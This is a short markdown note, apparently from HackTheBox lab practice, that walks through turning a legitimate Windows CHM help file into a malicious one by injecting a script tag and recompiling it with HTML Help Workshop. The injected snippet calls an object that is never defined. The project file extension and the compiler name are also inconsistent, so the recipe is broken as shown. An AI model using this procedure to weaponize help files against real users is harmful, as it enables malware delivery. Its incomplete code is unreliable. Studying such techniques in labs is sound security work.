# fichier chm

(hackthebox: VM sniper pour avoir un CHM malicieux Ã  modifier ensuite avec les utilitaires Windows (lire le tuto ci-dessous))


## Procedure for generating Malicious CHM file

0. Download and install [**Microsoft HTML Help Workshop and Documentation**](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/microsoft-html-help-downloads)
1. Obtain a valid CHM file and unpack it using 7-zip
2. Find an entry-point HTML file within "_docs_" directory and insert the following code into it's `<body>` section:

```xml

<SCRIPT>
  x.Click();
</SCRIPT>
```

3. Prepare `Project.hpp` file with contents like the below ones:

```txt
[OPTIONS]
Contents file=<PATH-TO-UNPACKED-CHM-DIRECTORY>\Table of Contents.hhc
[FILES]
<PATH-TO-UNPACKED-CHM-DIRECTORY>\docs\Malicious-File.htm
```

Add every file needed by that CHM to the `FILES` section. Remember to include also previously modified malicious HTM file.


4. Compile the project within CHM directory using `hpp.exe` compiler:

```batch
<PATH-TO-UNPACKED-CHM-DIRECTORY> "C:\Program Files (x86)\HTML Help Workshop\hhc.exe" Project.hpp
Microsoft HTML Help Compiler 4.74.8702

Compiling <PATH-TO-UNPACKED-CHM-DIRECTORY>\Project.chm


Compile time: 0 minutes, 1 second
353     Topics
7,208   Local links
187     Internet links
2       Graphics


Created <PATH-TO-UNPACKED-CHM-DIRECTORY>\Project.chm, 817,791 bytes
Compression decreased file by 2,091,702 bytes.
```

5. Exploit.

